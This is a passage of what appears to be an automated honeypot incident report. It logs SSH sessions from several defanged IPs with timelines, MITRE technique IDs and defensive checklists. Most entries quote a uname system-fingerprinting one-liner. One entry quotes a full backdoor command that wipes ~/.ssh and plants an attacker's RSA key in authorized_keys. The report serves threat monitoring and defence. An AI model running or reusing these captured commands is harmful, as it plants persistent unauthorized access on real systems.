| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:22:44` | `cowrie.session.connect` |
| `2026-07-04 03:22:44` | `cowrie.client.version` |
| `2026-07-04 03:22:44` | `cowrie.client.kex` |
| `2026-07-04 03:22:45` | `cowrie.login.success` |
| `2026-07-04 03:22:46` | `cowrie.session.params` |
| `2026-07-04 03:22:46` | `cowrie.command.input` |
| `2026-07-04 03:22:46` | `cowrie.command.input` |
| `2026-07-04 03:22:46` | `cowrie.command.input` |
| `2026-07-04 03:22:46` | `cowrie.command.input` |
| `2026-07-04 03:22:46` | `cowrie.command.input` |
| `2026-07-04 03:22:46` | `cowrie.command.success` |
| `2026-07-04 03:22:46` | `cowrie.command.input` |
| `2026-07-04 03:22:46` | `cowrie.command.input` |
| `2026-07-04 03:22:46` | `cowrie.command.input` |
| `2026-07-04 03:22:46` | `cowrie.command.input` |
| `2026-07-04 03:22:46` | `cowrie.log.closed` |
| `2026-07-04 03:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64ce33aec394

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:27 |
| **Last Seen** | 2026-07-04 03:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:27:49` | `cowrie.session.connect` |
| `2026-07-04 03:27:49` | `cowrie.client.version` |
| `2026-07-04 03:27:49` | `cowrie.client.kex` |
| `2026-07-04 03:27:49` | `cowrie.login.success` |
| `2026-07-04 03:27:50` | `cowrie.session.params` |
| `2026-07-04 03:27:50` | `cowrie.command.input` |
| `2026-07-04 03:27:50` | `cowrie.command.input` |
| `2026-07-04 03:27:50` | `cowrie.command.input` |
| `2026-07-04 03:27:50` | `cowrie.command.input` |
| `2026-07-04 03:27:50` | `cowrie.command.input` |
| `2026-07-04 03:27:50` | `cowrie.command.success` |
| `2026-07-04 03:27:50` | `cowrie.command.input` |
| `2026-07-04 03:27:50` | `cowrie.command.input` |
| `2026-07-04 03:27:50` | `cowrie.command.input` |
| `2026-07-04 03:27:50` | `cowrie.command.input` |
| `2026-07-04 03:27:50` | `cowrie.log.closed` |
| `2026-07-04 03:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ad39bbeaf4a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:28 |
| **Last Seen** | 2026-07-04 03:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:28:12` | `cowrie.session.connect` |
| `2026-07-04 03:28:13` | `cowrie.client.version` |
| `2026-07-04 03:28:13` | `cowrie.client.kex` |
| `2026-07-04 03:28:15` | `cowrie.login.success` |
| `2026-07-04 03:28:17` | `cowrie.session.params` |
| `2026-07-04 03:28:17` | `cowrie.command.input` |
| `2026-07-04 03:28:17` | `cowrie.command.input` |
| `2026-07-04 03:28:17` | `cowrie.command.input` |
| `2026-07-04 03:28:17` | `cowrie.command.input` |
| `2026-07-04 03:28:17` | `cowrie.command.input` |
| `2026-07-04 03:28:17` | `cowrie.command.success` |
| `2026-07-04 03:28:17` | `cowrie.command.input` |
| `2026-07-04 03:28:17` | `cowrie.command.input` |
| `2026-07-04 03:28:17` | `cowrie.command.input` |
| `2026-07-04 03:28:17` | `cowrie.command.input` |
| `2026-07-04 03:28:18` | `cowrie.log.closed` |
| `2026-07-04 03:28:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3e129440afd

| Field | Detail |
|---|---|
| **Source IP** | `118.145.102[.]69` |
| **First Seen** | 2026-07-04 03:29 |
| **Last Seen** | 2026-07-04 03:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:29:59` | `cowrie.session.connect` |
| `2026-07-04 03:30:00` | `cowrie.client.version` |
| `2026-07-04 03:30:00` | `cowrie.client.kex` |
| `2026-07-04 03:30:01` | `cowrie.login.success` |
| `2026-07-04 03:30:02` | `cowrie.session.params` |
| `2026-07-04 03:30:02` | `cowrie.command.input` |
| `2026-07-04 03:30:02` | `cowrie.command.failed` |
| `2026-07-04 03:30:02` | `cowrie.log.closed` |
| `2026-07-04 03:30:03` | `cowrie.session.params` |
| `2026-07-04 03:30:03` | `cowrie.command.input` |
| `2026-07-04 03:30:04` | `cowrie.session.file_download` |
| `2026-07-04 03:30:04` | `cowrie.log.closed` |
| `2026-07-04 03:30:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.102[.]69` to AbuseIPDB if not already reported
- [ ] Block `118.145.102[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03865ec28aee

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:30 |
| **Last Seen** | 2026-07-04 03:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:30:00` | `cowrie.session.connect` |
| `2026-07-04 03:30:00` | `cowrie.client.version` |
| `2026-07-04 03:30:00` | `cowrie.client.kex` |
| `2026-07-04 03:30:02` | `cowrie.login.success` |
| `2026-07-04 03:30:04` | `cowrie.session.params` |
| `2026-07-04 03:30:04` | `cowrie.command.input` |
| `2026-07-04 03:30:04` | `cowrie.command.input` |
| `2026-07-04 03:30:04` | `cowrie.command.input` |
| `2026-07-04 03:30:04` | `cowrie.command.input` |
| `2026-07-04 03:30:04` | `cowrie.command.input` |
| `2026-07-04 03:30:04` | `cowrie.command.success` |
| `2026-07-04 03:30:04` | `cowrie.command.input` |
| `2026-07-04 03:30:04` | `cowrie.command.input` |
| `2026-07-04 03:30:04` | `cowrie.command.input` |
| `2026-07-04 03:30:04` | `cowrie.command.input` |
| `2026-07-04 03:30:04` | `cowrie.log.closed` |
| `2026-07-04 03:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82bdafe920a8

| Field | Detail |
|---|---|
| **Source IP** | `118.145.102[.]69` |
| **First Seen** | 2026-07-04 03:30 |
| **Last Seen** | 2026-07-04 03:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:30:04` | `cowrie.session.connect` |
| `2026-07-04 03:30:04` | `cowrie.client.version` |
| `2026-07-04 03:30:05` | `cowrie.client.kex` |
| `2026-07-04 03:30:06` | `cowrie.login.success` |
| `2026-07-04 03:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.102[.]69` to AbuseIPDB if not already reported
- [ ] Block `118.145.102[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b8f41a9da82

| Field | Detail |
|---|---|
| **Source IP** | `118.145.102[.]69` |
| **First Seen** | 2026-07-04 03:30 |
| **Last Seen** | 2026-07-04 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:30:07` | `cowrie.session.connect` |
| `2026-07-04 03:30:07` | `cowrie.client.version` |
| `2026-07-04 03:30:07` | `cowrie.client.kex` |
| `2026-07-04 03:30:08` | `cowrie.login.success` |
| `2026-07-04 03:30:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.102[.]69` to AbuseIPDB if not already reported
- [ ] Block `118.145.102[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af94a1f49e74

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:31 |
| **Last Seen** | 2026-07-04 03:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:31:43` | `cowrie.session.connect` |
| `2026-07-04 03:31:44` | `cowrie.client.version` |
| `2026-07-04 03:31:44` | `cowrie.client.kex` |
| `2026-07-04 03:31:45` | `cowrie.login.success` |
| `2026-07-04 03:31:47` | `cowrie.session.params` |
| `2026-07-04 03:31:47` | `cowrie.command.input` |
| `2026-07-04 03:31:47` | `cowrie.command.input` |
| `2026-07-04 03:31:47` | `cowrie.command.input` |
| `2026-07-04 03:31:47` | `cowrie.command.input` |
| `2026-07-04 03:31:47` | `cowrie.command.input` |
| `2026-07-04 03:31:47` | `cowrie.command.success` |
| `2026-07-04 03:31:47` | `cowrie.command.input` |
| `2026-07-04 03:31:47` | `cowrie.command.input` |
| `2026-07-04 03:31:47` | `cowrie.command.input` |
| `2026-07-04 03:31:47` | `cowrie.command.input` |
| `2026-07-04 03:31:47` | `cowrie.log.closed` |
| `2026-07-04 03:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7c900219cca

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 03:31 |
| **Last Seen** | 2026-07-04 03:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:31:52` | `cowrie.session.connect` |
| `2026-07-04 03:31:54` | `cowrie.client.version` |
| `2026-07-04 03:31:54` | `cowrie.client.kex` |
| `2026-07-04 03:31:59` | `cowrie.login.success` |
| `2026-07-04 03:32:03` | `cowrie.session.params` |
| `2026-07-04 03:32:03` | `cowrie.command.input` |
| `2026-07-04 03:32:05` | `cowrie.log.closed` |
| `2026-07-04 03:32:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f28bdd13b422

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:33 |
| **Last Seen** | 2026-07-04 03:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:33:26` | `cowrie.session.connect` |
| `2026-07-04 03:33:26` | `cowrie.client.version` |
| `2026-07-04 03:33:26` | `cowrie.client.kex` |
| `2026-07-04 03:33:27` | `cowrie.login.success` |
| `2026-07-04 03:33:29` | `cowrie.session.params` |
| `2026-07-04 03:33:29` | `cowrie.command.input` |
| `2026-07-04 03:33:29` | `cowrie.command.input` |
| `2026-07-04 03:33:29` | `cowrie.command.input` |
| `2026-07-04 03:33:29` | `cowrie.command.input` |
| `2026-07-04 03:33:29` | `cowrie.command.input` |
| `2026-07-04 03:33:29` | `cowrie.command.success` |
| `2026-07-04 03:33:29` | `cowrie.command.input` |
| `2026-07-04 03:33:29` | `cowrie.command.input` |
| `2026-07-04 03:33:29` | `cowrie.command.input` |
| `2026-07-04 03:33:29` | `cowrie.command.input` |
| `2026-07-04 03:33:29` | `cowrie.log.closed` |
| `2026-07-04 03:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eafebc762941

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:34 |
| **Last Seen** | 2026-07-04 03:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:34:31` | `cowrie.session.connect` |
| `2026-07-04 03:34:31` | `cowrie.client.version` |
| `2026-07-04 03:34:31` | `cowrie.client.kex` |
| `2026-07-04 03:34:32` | `cowrie.login.success` |
| `2026-07-04 03:34:33` | `cowrie.session.params` |
| `2026-07-04 03:34:33` | `cowrie.command.input` |
| `2026-07-04 03:34:33` | `cowrie.command.input` |
| `2026-07-04 03:34:33` | `cowrie.command.input` |
| `2026-07-04 03:34:33` | `cowrie.command.input` |
| `2026-07-04 03:34:33` | `cowrie.command.input` |
| `2026-07-04 03:34:33` | `cowrie.command.success` |
| `2026-07-04 03:34:33` | `cowrie.command.input` |
| `2026-07-04 03:34:33` | `cowrie.command.input` |
| `2026-07-04 03:34:33` | `cowrie.command.input` |
| `2026-07-04 03:34:33` | `cowrie.command.input` |
| `2026-07-04 03:34:33` | `cowrie.log.closed` |
| `2026-07-04 03:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5437a98781ee

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 03:34 |
| **Last Seen** | 2026-07-04 03:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:34:51` | `cowrie.session.connect` |
| `2026-07-04 03:34:51` | `cowrie.client.version` |
| `2026-07-04 03:34:51` | `cowrie.client.kex` |
| `2026-07-04 03:34:52` | `cowrie.login.success` |
| `2026-07-04 03:34:52` | `cowrie.session.params` |
| `2026-07-04 03:34:52` | `cowrie.command.input` |
| `2026-07-04 03:34:52` | `cowrie.log.closed` |
| `2026-07-04 03:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b32a82be23fd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:35 |
| **Last Seen** | 2026-07-04 03:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:35:10` | `cowrie.session.connect` |
| `2026-07-04 03:35:10` | `cowrie.client.version` |
| `2026-07-04 03:35:10` | `cowrie.client.kex` |
| `2026-07-04 03:35:12` | `cowrie.login.success` |
| `2026-07-04 03:35:13` | `cowrie.session.params` |
| `2026-07-04 03:35:13` | `cowrie.command.input` |
| `2026-07-04 03:35:13` | `cowrie.command.input` |
| `2026-07-04 03:35:13` | `cowrie.command.input` |
| `2026-07-04 03:35:13` | `cowrie.command.input` |
| `2026-07-04 03:35:13` | `cowrie.command.input` |
| `2026-07-04 03:35:13` | `cowrie.command.success` |
| `2026-07-04 03:35:13` | `cowrie.command.input` |
| `2026-07-04 03:35:13` | `cowrie.command.input` |
| `2026-07-04 03:35:13` | `cowrie.command.input` |
| `2026-07-04 03:35:13` | `cowrie.command.input` |
| `2026-07-04 03:35:13` | `cowrie.log.closed` |
| `2026-07-04 03:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab43cd8136d7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:36 |
| **Last Seen** | 2026-07-04 03:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:36:49` | `cowrie.session.connect` |
| `2026-07-04 03:36:49` | `cowrie.client.version` |
| `2026-07-04 03:36:49` | `cowrie.client.kex` |
| `2026-07-04 03:36:50` | `cowrie.login.success` |
| `2026-07-04 03:36:51` | `cowrie.session.params` |
| `2026-07-04 03:36:51` | `cowrie.command.input` |
| `2026-07-04 03:36:51` | `cowrie.command.input` |
| `2026-07-04 03:36:51` | `cowrie.command.input` |
| `2026-07-04 03:36:51` | `cowrie.command.input` |
| `2026-07-04 03:36:51` | `cowrie.command.input` |
| `2026-07-04 03:36:51` | `cowrie.command.success` |
| `2026-07-04 03:36:51` | `cowrie.command.input` |
| `2026-07-04 03:36:51` | `cowrie.command.input` |
| `2026-07-04 03:36:51` | `cowrie.command.input` |
| `2026-07-04 03:36:51` | `cowrie.command.input` |
| `2026-07-04 03:36:52` | `cowrie.log.closed` |
| `2026-07-04 03:36:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49de9512e002

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:38 |
| **Last Seen** | 2026-07-04 03:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:38:27` | `cowrie.session.connect` |
| `2026-07-04 03:38:27` | `cowrie.client.version` |
| `2026-07-04 03:38:27` | `cowrie.client.kex` |
| `2026-07-04 03:38:28` | `cowrie.login.success` |
| `2026-07-04 03:38:29` | `cowrie.session.params` |
| `2026-07-04 03:38:29` | `cowrie.command.input` |
| `2026-07-04 03:38:29` | `cowrie.command.input` |
| `2026-07-04 03:38:29` | `cowrie.command.input` |
| `2026-07-04 03:38:29` | `cowrie.command.input` |
| `2026-07-04 03:38:29` | `cowrie.command.input` |
| `2026-07-04 03:38:29` | `cowrie.command.success` |
| `2026-07-04 03:38:29` | `cowrie.command.input` |
| `2026-07-04 03:38:29` | `cowrie.command.input` |
| `2026-07-04 03:38:29` | `cowrie.command.input` |
| `2026-07-04 03:38:29` | `cowrie.command.input` |
| `2026-07-04 03:38:30` | `cowrie.log.closed` |
| `2026-07-04 03:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
